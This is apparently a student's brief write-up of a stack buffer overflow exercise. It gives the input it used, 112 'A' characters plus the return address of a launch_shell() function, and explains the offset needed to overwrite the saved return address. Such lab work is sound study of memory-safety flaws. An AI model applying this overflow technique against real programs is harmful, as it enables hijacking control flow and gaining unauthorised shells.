My input to this program to launch the launch_shell() function was
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
QUUUU‚èé

This is "A" * 112 + the return address of the launch_shell() function. I found that becuase of the other things
that are in the function as well as the buffer, it was required to add an extra 12 characters in order to being
to re-write the return address
